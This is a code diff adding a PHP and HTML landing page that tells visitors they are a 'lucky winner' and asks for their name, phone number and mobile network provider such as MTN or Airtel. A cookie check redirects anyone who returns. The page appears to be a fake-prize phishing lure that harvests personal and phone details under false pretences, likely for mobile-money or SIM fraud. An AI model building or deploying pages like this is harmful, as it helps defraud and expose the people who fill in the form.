@@ -1,0 +1,40 @@
+
+<?php
+// Check if the cookie is set to determine if the user has already viewed the landing page
+if (!isset($_COOKIE['viewed_landing_page'])) {
+    // User has not viewed the landing page, so set the cookie
+    setcookie('viewed_landing_page', '1', time() + 86400); // Set a cookie that expires in 24 hours
+} else {
+    // User has already viewed the landing page, so redirect them to another page
+    header('Location: other_page.php'); // Replace 'other_page.php' with your desired redirect URL.
+    exit();
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Landing Page</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <img src="j.png" alt="Girl in a jacket" width="300" height="200">
+        <h3>congraratulations you are one of our lucky winner enter your name, phone numer network prodiver E.G mtn, airtlel etc..........</h3>
+        
+        <form id="userForm" action="landing_page.php" method="GET">
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" required><br><br>
+        <label for="phone">Phone Number:</label>
+        <input type="tel" id="phone" name="phone" required><br><br>
+        <label     for="provider">Network Provider:</label>
+        <input type="text" id="provider" name="provider" required><br><br>
+        <button type="submit">Submit</button>
+    </form>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
